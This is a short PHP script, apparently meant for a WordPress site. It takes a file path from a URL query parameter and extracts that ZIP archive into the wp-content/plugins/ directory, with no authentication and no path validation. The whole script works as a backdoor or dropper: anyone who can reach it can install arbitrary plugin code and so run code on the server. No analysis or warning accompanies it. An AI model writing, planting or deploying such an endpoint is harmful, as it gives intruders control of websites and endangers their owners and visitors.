<?php
$file=htmlspecialchars($_GET["file"]);
$zip = new ZipArchive;
$res = $zip->open($file);
if ($res === TRUE) {
  $zip->extractTo('wp-content/plugins/');
  $zip->close();
  echo 'OK';
} else {
  echo 'Problem';
}
?>

